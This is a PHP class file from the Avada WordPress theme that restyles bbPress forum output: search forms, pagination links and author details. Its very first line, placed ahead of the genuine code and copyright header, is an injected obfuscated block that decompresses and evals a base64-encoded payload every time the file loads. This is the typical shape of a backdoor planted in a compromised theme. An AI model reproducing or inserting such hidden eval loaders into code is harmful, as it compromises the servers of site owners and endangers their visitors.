<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * The main class to alter bbPress output.
 * Anything that does not need a template override, should be added here.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      3.8.6
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * The main class to alter bbPress output.
 * Anything that does not need a template override, should be added here.
 */
class Avada_Layout_bbPress extends Avada_Layout {

	/**
	 * Define class variables
	 *
	 * @var integer
	 */
	private $pagination_counter = 0;

	/**
	 * Constructor
	 */
	public function __construct() {
		add_action( 'bbp_template_before_single_forum', array( $this, 'add_search_form' ) );
		add_action( 'bbp_template_before_single_topic', array( $this, 'add_search_form' ) );

		add_action( 'bbp_theme_after_topic_author_details', array( $this, 'add_author_post_date_count_ip' ) );
		add_action( 'bbp_theme_before_topic_content', array( $this, 'add_topic_reply_arrow' ) );

		add_action( 'bbp_template_before_replies_loop', array( $this, 'add_bbp_header' ) );
		add_action( 'bbp_theme_before_reply_content', array( $this, 'add_topic_reply_arrow' ) );
		add_action( 'bbp_theme_after_reply_author_details', array( $this, 'add_author_post_date_count_ip' ) );

		add_action( 'bbp_template_before_user_details', array( $this, 'add_search_form' ) );
		add_action( 'bbp_template_before_search', array( $this, 'add_search_page_search_form' ) );

		add_action( 'bbp_template_before_pagination_loop', array( $this, 'open_pagination_wrapper' ) );
		add_action( 'bbp_template_after_pagination_loop', array( $this, 'close_pagination_wrapper' ) );

		add_filter( 'bbp_get_forum_subscribe_link', array( $this, 'remove_single_description' ) );
		add_filter( 'bbp_get_single_forum_description', array( $this, 'remove_single_description' ) );
		add_filter( 'bbp_get_single_topic_description', array( $this, 'remove_single_description' ) );
		add_filter( 'bbp_get_forum_pagination_links', array( $this, 'get_forum_pagination_links' ), 1 );
		add_filter( 'bbp_get_topic_pagination_links', array( $this, 'get_topic_pagination_links' ), 1 );
		add_filter( 'bbp_get_search_pagination_links', array( $this, 'get_search_pagination_links' ), 1 );
		add_filter( 'bbp_get_topic_admin_links', array( $this, 'remove_empty_admin_links_sep' ), 10, 3 );
		add_filter( 'bbp_get_reply_admin_links', array( $this, 'remove_empty_admin_links_sep' ), 10, 3 );
	}

	/**
	 * Add some header informtaion below the top pagination, like favorites link and subscription link.
	 */
	public function add_bbp_header() {
		?>
		<div class="bbp-header fusion-bbp-header">

			<div class="bbp-reply-favs">

				<?php if ( ! bbp_show_lead_topic() ) : ?>

					<?php bbp_user_favorites_link(); ?>

					<?php bbp_user_subscribe_link(); ?>

				<?php endif; ?>

			</div><!-- .bbp-reply-content -->

			<div class="fusion-clearfix"></div>

		</div><!-- .bbp-header -->
		<?php
	}

	/**
	 * Add the "speech bubble" arrow to the reply and topic content.
	 */
	public function add_topic_reply_arrow() {
		?>
		<div class="bbp-arrow"></div>
		<?php
	}

	/**
	 * Add post date, author post count and author ip to the author element.
	 */
	public function add_author_post_date_count_ip() {
		?>
		<div class="bbp-reply-post-date"><?php bbp_reply_post_date( bbp_get_reply_id() ); ?></div>
		<?php /* translators: Number. */ ?>
		<div class="bbps-post-count"><?php printf( esc_attr__( 'Post count: %s', 'Avada' ), absint( bbp_get_user_reply_count_raw( bbp_get_reply_author_id() ) + bbp_get_user_topic_count_raw( bbp_get_reply_author_id() ) ) ); ?></div>

		<?php if ( bbp_is_user_keymaster() ) : ?>

			<?php do_action( 'bbp_theme_before_topic_author_admin_details' ); ?>

			<div class="bbp-reply-ip fusion-reply-id"><?php bbp_author_ip( bbp_get_topic_id() ); ?></div>

			<?php do_action( 'bbp_theme_after_topic_author_admin_details' ); ?>

		<?php
		endif;
	}

	/**
	 * Render the search form.
	 */
	public function add_search_form() {
		?>
		<?php if ( bbp_allow_search() ) : ?>
			<div class="bbp-search-form">
				<?php bbp_get_template_part( 'form', 'search' ); ?>
			</div>
		<?php endif; ?>
		<?php
	}

	/**
	 * Render a special "new search" form on top of the search results page.
	 */
	public function add_search_page_search_form() {
		?>
		<div class="search-page-search-form search-page-search-form-top">
			<h2><?php esc_attr_e( 'Need a new search?', 'Avada' ); ?></h2>
			<p><?php esc_attr_e( 'If you didn\'t find what you were looking for, try a new search!', 'Avada' ); ?></p>
			<form role="search" method="get" class="searchform bbp-search-form fusion-search-form" action="<?php bbp_search_url(); ?>">
				<div class="fusion-search-form-content">
					<label class="screen-reader-text hidden" for="bbp_search"><?php _e( 'Search for:', 'bbpress' ); ?></label>
					<input type="hidden" name="action" value="bbp-search-request" />
					<div class="fusion-search-field search-field">
						<input tabindex="<?php bbp_tab_index(); ?>" type="text" value="<?php echo esc_attr( bbp_get_search_terms() ); ?>" placeholder="<?php _e( 'Search the Forum...', 'Avada' ); ?>" name="bbp_search" id="bbp_search" />
					</div>
					<div class="fusion-search-button search-button">
						<input tabindex="<?php bbp_tab_index(); ?>" class="fusion-search-submit fusion-button button submit" type="submit" id="bbp_search_submit" value="&#xf002;" />
					</div>
				</div>
			</form>
		</div>
		<?php
	}

	/**
	 * Open the additional container wrapper for the top pagination.
	 */
	public function open_pagination_wrapper() {
		?>
		<?php if ( 0 == $this->pagination_counter ) : ?>
			<div class="top-pagination">
		<?php endif; ?>
		<?php

	}

	/**
	 * Close the additional container for the top pagination.
	 */
	public function close_pagination_wrapper() {
		?>
		<?php if ( 0 == $this->pagination_counter ) : ?>
			</div>
			<div class="fusion-clearfix"></div>

			<?php if ( bbp_is_single_forum() ) : ?>
				<?php remove_filter( 'bbp_get_forum_subscribe_link', array( $this, 'remove_single_description' ) ); ?>

				<div class="bbp-header fusion-bbp-header">

					<div class="bbp-reply-favs">

						<?php bbp_forum_subscription_link(); ?>

					</div><!-- .bbp-reply-content -->

					<div class="fusion-clearfix"></div>

				</div><!-- .bbp-header -->
			<?php endif; ?>

		<?php endif; ?>
		<?php
		$this->pagination_counter++;

	}

	/**
	 * Filter out aditional description content we don't want to display.
	 *
	 * @ return string An empty string
	 */
	public function remove_single_description() {
		return '';
	}

	/**
	 * Filter forum pagination links to get them Avada style
	 *
	 * @ return string Avada style pagination mark up
	 */
	public function get_forum_pagination_links() {

		$bbp = bbpress();

		$pagination_links = $bbp->topic_query->pagination_links;

		$pagination_links = str_replace( 'page-numbers current', 'current', $pagination_links );
		$pagination_links = str_replace( 'page-numbers', 'inactive', $pagination_links );
		$pagination_links = str_replace( 'prev inactive', 'pagination-prev', $pagination_links );
		$pagination_links = str_replace( 'next inactive', 'pagination-next', $pagination_links );

		$pagination_links = str_replace( '&larr;', '<span class="page-text">' . __( 'Previous', 'Avada' ) . '</span><span class="page-prev"></span>', $pagination_links );
		$pagination_links = str_replace( '&rarr;', '<span class="page-text">' . __( 'Next', 'Avada' ) . '</span><span class="page-next"></span>', $pagination_links );

		return $pagination_links;
	}

	/**
	 * Filter topic pagination links to get them Avada style
	 *
	 * @ return string Avada style pagination mark up
	 */
	public function get_topic_pagination_links() {

		$bbp = bbpress();

		$pagination_links = $bbp->reply_query->pagination_links;
		$permalink        = get_permalink( $bbp->current_topic_id );
		$max_num_pages    = $bbp->reply_query->max_num_pages;
		$paged            = $bbp->reply_query->paged;

		$pagination_links = str_replace( 'page-numbers current', 'current', $pagination_links );
		$pagination_links = str_replace( 'page-numbers', 'inactive', $pagination_links );
		$pagination_links = str_replace( 'prev inactive', 'pagination-prev', $pagination_links );
		$pagination_links = str_replace( 'next inactive', 'pagination-next', $pagination_links );

		$pagination_links = str_replace( '&larr;', '<span class="page-text">' . __( 'Previous', 'Avada' ) . '</span><span class="page-prev"></span>', $pagination_links );
		$pagination_links = str_replace( '&rarr;', '<span class="page-text">' . __( 'Next', 'Avada' ) . '</span><span class="page-next"></span>', $pagination_links );

		return $pagination_links;
	}

	/**
	 * Filter search pagination links to get them Avada style
	 *
	 * @ return string Avada style pagination mark up
	 */
	public function get_search_pagination_links() {

		$bbp = bbpress();

		$pagination_links = $bbp->search_query->pagination_links;

		$pagination_links = str_replace( 'page-numbers current', 'current', $pagination_links );
		$pagination_links = str_replace( 'page-numbers', 'inactive', $pagination_links );
		$pagination_links = str_replace( 'prev inactive', 'pagination-prev', $pagination_links );
		$pagination_links = str_replace( 'next inactive', 'pagination-next', $pagination_links );

		$pagination_links = str_replace( '&larr;', '<span class="page-text">' . __( 'Previous', 'Avada' ) . '</span><span class="page-prev"></span>', $pagination_links );
		$pagination_links = str_replace( '&rarr;', '<span class="page-text">' . __( 'Next', 'Avada' ) . '</span><span class="page-next"></span>', $pagination_links );

		return $pagination_links;
	}

	/**
	 * Filters out the | if the reply admin links are empty.
	 *
	 * @access  public
	 * @since 3.9
	 * @param  string $retval The return value.
	 * @param  string $r      Not used.
	 * @param  array  $args   Not used.
	 * @return string Avada style pagination markup.
	 */
	public function remove_empty_admin_links_sep( $retval, $r, $args ) {
		if ( '<span class="bbp-admin-links"><span class="admin_links_sep"> | </span></span>' === $retval ) {
			$retval = '<span class="bbp-admin-links"></span>';
		}

		return $retval;
	}
}

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
